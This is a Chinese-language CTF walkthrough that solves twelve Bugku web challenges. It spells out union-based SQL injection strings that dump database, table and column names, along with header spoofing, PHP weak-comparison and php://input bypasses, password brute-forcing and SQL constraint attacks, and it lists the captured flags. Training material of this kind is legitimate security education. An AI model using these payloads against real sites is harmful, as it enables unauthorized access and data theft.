### 这些题目涉及到的知识点

web11 X-Forward-For伪造本地地址，base64解码 前端代码审计

web12 SQL注入

web13 base64解码，url解码，PHP弱比较，PHP伪协议，php代码审计

web14 burpsuite爆破模块的使用

web15 base64加密解密，修改url参数获取信息

web16 Referer请求头的利用

web17 SQL约束攻击

web18 利用php弱比较实现，实现md5碰撞

web19 x-forward-for 请求头，伪造访问地址

web20 简单的php代码审计，考php弱类型比较（“==”）和强类型比较（“===”）

web21 目录扫描工具的使用以及burp爆破模块的使用

web22 php伪协议应用

### **Web11题 题目：本地管理员 **

进入环境查看源代码

![图片.png](https://image.3001.net/images/20210813/1628825356_6115e70c3a530a8641d43.png!small)

![图片.png](https://image.3001.net/images/20210813/1628825370_6115e71aa0fb7b24ecd98.png!small)

这个应该就是密码了

![图片.png](https://image.3001.net/images/20210813/1628825387_6115e72b5bb51a44d996c.png!small)

发现还是不行根据提示burp抓包使用X-Forward-For伪造本地地址

![图片.png](https://image.3001.net/images/20210813/1628825399_6115e737a9f40d9b306ac.png!small)
**于是拿到flag{55c158bf41cc9b1aef1e10cace012823}**

### **Web 12题 题目：成绩查询 **

1' order by 1# 一直试到5的时候 报错了 说明四列

查看当前数据库的名字

    
    
    a' union select 1,2,database(),4 #
    

![图片.png](https://image.3001.net/images/20210813/1628825544_6115e7c80a90d1ce9452b.png!small)

查看所有数据库的名字

    
    
    a'  union select 1,group_concat(schema_name),3,4 from information_schema.schemata#
    

![图片.png](https://image.3001.net/images/20210813/1628825566_6115e7de762854e8ffa9b.png!small)查看表的名字

    
    
    a' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema ='skctf' #
    

![图片.png](https://image.3001.net/images/20210813/1628825586_6115e7f2e83aa9bc19333.png!small)查看列名

    
    
    a' union select 1,group_concat(column_name),3,4 from  information_schema.columns where table_name ='fl4g' #
    

![图片.png](https://image.3001.net/images/20210813/1628825597_6115e7fdbdec3b866b1ed.png!small)查数据

    
    
    a' union select skctf_flag,2,3,4 from fl4g limit 0,1#   爆数据
    

![图片.png](https://image.3001.net/images/20210813/1628825610_6115e80ab8005e83efaf5.png!small)flag{123e34de23ebea1eb591e119370e6df0}

### **Web 13 题目：never never give up **

进入环境查看

使用view-source查看源代码，view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP
pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。
如果要在IE下查看源代码,只能使用查看中的"查看源代码"命令.在该页面看到了一串经过url编码后的字符 后面跟了一串经过base64编码后的字符

![图片.png](https://image.3001.net/images/20210813/1628825704_6115e86875f3b56331c4c.png!small)

url解码后

    
    
    JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF
    然后进行base64解密
    %22%3Bif(!%24_GET%5B'id'%5D)%0A%7B%0A%09header('Location%3A%20hello.php%3Fid%3D1')%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B'id'%5D%3B%0A%24a%3D%24_GET%5B'a'%5D%3B%0A%24b%3D%24_GET%5B'b'%5D%3B%0Aif(stripos(%24a%2C'.'))%0A%7B%0A%09echo%20'no%20no%20no%20no%20no%20no%20no'%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C'r')%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E
    然后进行url编码解析得到源码，进行源码分析
    
    
    
    if(!$_GET['id'])                              //id的值不能取0
    {
    	header('Location: hello.php?id=1');
    	exit();
    }
    $id=$_GET['id'];
    $a=$_GET['a'];
    $b=$_GET['b'];
    if(stripos($a,'.'))                  //定义和用法；stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。                               //$a里面不能含有.
    {
    	echo 'no no no no no no no';
    	return ;
    }
    $data = @file_get_contents($a,'r');  // file_get_contents() 把文件读入一个字符串。
    
    
    if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
    /*  id的值弱比较等于0,但是id又不能等于0，那么这里就涉及到PHP弱比较的问题了， 这里我就简单的讲讲php弱比较的问题
    1 <?php
    2 var_dump("admin"==0);  //true
    3 var_dump("1admin"==1); //true
    4 var_dump("admin1"==1) //false
    5 var_dump("admin1"==0) //true
    6 var_dump("0e123456"=="0e4456789"); //true 
    7 ?>  //
    上述代码可自行测试
    
    1 观察上述代码，"admin"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0，自然和0相等
    2 "1admin"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是"admin1"被转化成了0,为什么呢？？
        因为在转化前会识别第一个字符，第一个字符是数字那么就会把该字符串当成数字，该字符串后面的字符会被忽略，如果字符串的第一个字符不是数字，那么就会将该字符串强制转换成数值。所以我们发现"1admin"==1 比较的结果是ture，而“admin1“==1 比较的结果是false
    3 "0e123456"=="0e456789"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等，此类弱比较缺陷，往往用来绕过一些md5加密以0e开头的字符串的比较。
     所以通过简单的学习php弱比较，这里我们知道了，可以通过给id赋值 id=aa  这种不是数字的值，通过其弱比较的缺陷来绕过。
    
    源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。所以我们需要在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!，从而使得$date=bugku is a nice plateform!
    
    通过看源码我们知道$b的值的长度必须大于5，并且$b的第一位字符不等于4，但是同时又要求$b的第一位字符拼接在111后面，两者形成的字符串等于1114，所以我们可以通过正则匹配的思路来绕过，我们可以令$b=*000000  显然此时b的长度大于5，而且b的第一位字符也不是4，又由于*可以匹配任意字符，所以就同时满足了这些条件的要求。
    */
    
    {
    	$flag = "flag{***********}"
    }
    else
    {
    	print "never never never give up !!!";
    }
    ?>
    

经过我们对源码的分析，payload已经了然于胸 ，我使用burp抓包，然后令id=aa a=php://input 并在请求的内容里写 bugku is
a nice plateform! b=*000000 如果所示  
![图片.png](https://image.3001.net/images/20210813/1628825727_6115e87f245abbc846611.png!small)我们可以在响应包里看到flag

### **Web14 题目：好像需要密码 **

进入环境 一个登录页面 直接用burp爆破 密码是12468 然后登录

![图片.png](https://image.3001.net/images/20210813/1628825770_6115e8aa145e620139e4e.png!small)拿到flag

![图片.png](https://image.3001.net/images/20210813/1628825777_6115e8b140e11d0fa80e5.png!small)

### **Web15 题目：cookies
**![图片.png](https://image.3001.net/images/20210813/1628825917_6115e93d2c26666472066.png!small)进入环境
发现上面 有一串base64的编码 文件名 解密  
![图片.png](https://image.3001.net/images/20210813/1628825958_6115e96665785a36a0112.png!small)![图片.png](https://image.3001.net/images/20210813/1628825962_6115e96aa15404ba184a1.png!small)

将index.php 进行base64加密后 然后进行访问 发现了php文件的开头 然后看到了 line 于是试着改变 line的值  
![图片.png](https://image.3001.net/images/20210813/1628825979_6115e97b8a75bb75e5ee3.png!small)![图片.png](https://image.3001.net/images/20210813/1628825983_6115e97fe2680b44e3bb4.png!small)

通过遍历line的值获得源码

    
    
    <?php                                                                                                                                                                                                    error_reporting(0);
    $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
    $line=isset($_GET['line'])?intval($_GET['line']):0;
    if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
    $file_list = array(
    '0' =>'keys.txt',
    '1' =>'index.php',
    );
    if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
    $file_list[2]='keys.php';
    }
    if(in_array($file, $file_list)){
    $fa = file($file);
    echo $fa[$line];
    }
    ?>
    

通过源码分析，我们抓包让cookie的值 为 margin = margin  
![图片.png](https://image.3001.net/images/20210813/1628825993_6115e989585374cc266cc.png!small)得到flag

### **Web16 题目：你从哪里来 **

![图片.png](https://image.3001.net/images/20210813/1628826027_6115e9ab75bd96ec67edd.png!small)

进入环境只有这一句话 查看源码也没发现什么 然后用翻墙 用google浏览器访问 发现还是不行 然后burp抓包

HTTP
Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。因此
在请求包头添加referer字段 和google的url 从而达到伪造网页是从 google.com连接过来的效果 获得flag  
![图片.png](https://image.3001.net/images/20210813/1628826048_6115e9c03937591c0fabf.png!small)

得到flag

### **Web17 题目:login1 **

![图片.png](https://image.3001.net/images/20210813/1628826170_6115ea3a5751bc3dede90.png!small)

提示是SQL约束攻击 所以先搜了一下什么是sql约束攻击

首先解释什么是sql约束攻击

在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire
”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。

![图片.png](https://image.3001.net/images/20210813/1628826179_6115ea432ddaf384c9210.png!small)

然后注册一个 账户：admin+n个空格 密码：XXXxxx111

![图片.png](https://image.3001.net/images/20210813/1628826205_6115ea5d5af16c4441977.png!small)

然后 登录 admin XXXxxx111 获得flag

flag{8e78fe2fe443fdfaee83df36b433c799}

###  **Web18 题目：MD5**

进入环境

![图片.png](https://image.3001.net/images/20210813/1628826238_6115ea7ee80c13b155f6a.png!small)

"0e123456"=="0e456789"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。

然后我们找个md5加密后是0e开头的字符串 赋值给a同时利用php弱比较的缺陷实现md5碰撞达到绕过的目的

![图片.png](https://image.3001.net/images/20210813/1628826246_6115ea86b56dec88e15ee.png!small)

###  **Web19 题目：程序员本地网站**

![图片.png](https://image.3001.net/images/20210813/1628826533_6115eba57a27e1f03059d.png!small)

bp抓包增加x-forward-for 请求头

x-forward-for 可以用于访问地址伪造，所以我们在这道题中，使用burpsuite抓包并且增加一个x-forward-for
并赋值127.0.0.1，从而达到伪造访问ip地址 使得服务器以为是本地访问 从而获得flag

flag{23c7caf14ec951d795e3779afe03fbd6}

###  **Web20题目：各种绕过**

进入环境查看代码

    
    
    <?php
    highlight_file('flag.php');
    $_GET['id'] = urldecode($_GET['id']);
    $flag = 'flag{xxxxxxxxxxxxxxxxxx}';
    if (isset($_GET['uname']) and isset($_POST['passwd'])) {      //l两个变量必须设置且不能为空
        if ($_GET['uname'] == $_POST['passwd'])   //两个变量弱比较不能相同
        print 'passwd can not be uname.';
     
    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))  //两个变量sha1后强比较相同，id值为margin
     
        die('Flag: '.$flag);
     
    else
     
        print 'sorry!';
        } 
    
    ?>
    

$_GET[‘id’] =
urldecode($_GET[‘id’])：需要注意$_GET本身会对用户传来的参数进行一次url解码，因此这相当于进行了两次url解码  
需要利用sha1()不能处理数组的漏洞，如果传入的值为数组，则sha1会返回NULL，因此只需让uname和passwd都为数组，等式成为NULL===NULL，成立条件成立，id值为margin，不需要进行url编码，直接赋值为margin，构建payload  
![图片.png](https://image.3001.net/images/20210813/1628826718_6115ec5ec5c265340e891.png!small)
**Web21 题目：需要管理员**

进入环境是这样一个页面 然后 也查看了页面源码 啥都没发现  
![图片.png](https://image.3001.net/images/20210813/1628826846_6115ecde60ff330782749.png!small)

御剑扫描目录

![图片.png](https://image.3001.net/images/20210813/1628826853_6115ece5c8096a489ab91.png!small)

访问robots.txt

![图片.png](https://image.3001.net/images/20210813/1628826860_6115ececa73a4d0e65883.png!small)

根据提示访问 /resusl.php  
![图片.png](https://image.3001.net/images/20210813/1628826874_6115ecfa08c05224e69a0.png!small)

这里让使用get传参的方法 传入一个x参数 ，要求x参数的值等于password

于是用burp抓包 然后使用 intruder 模块进行爆破

![图片.png](https://image.3001.net/images/20210813/1628826884_6115ed0493e6f419f9c0b.png!small)

password的值为admin

proxy模块右键发送给重发器 x的值改为 admin

![图片.png](https://image.3001.net/images/20210813/1628826907_6115ed1ba64601c36ad74.png!small)flag拿到

###  **Web22 题目：file_get_contents**

进入环境看到这些代码

    
    
    <?php
    extract($_GET);
    if (!empty($ac))    //变量ac的值不为空
    {
    $f = trim(file_get_contents($fn)); 
        /*变量f的值从文件fn中获取，此处用到了php的伪协议，这里用伪协议 php:// 来访问输入输出的数据流，这里令 $fn = “php://input”，并在请求主体中提交我们想赋给f的值。*/
    if ($ac === $f)   //变量ac的值等于f的值
    {
    echo "<p>This is flag:" ." $flag</p>";
    }
    else
    {
    echo "<p>sorry!</p>";
    }
    }
    ?>
    

所以我们用bp抓包 构造payload 给变量ac赋值等于123 变量fn=php://input 然后再请求主体中 输入123
这样就相当于间接的给变量f赋值了123 这样变量ac等于f 从而获得flag

![图片.png](https://image.3001.net/images/20210813/1628826933_6115ed3510fea4c915d45.png!small)

flag拿到

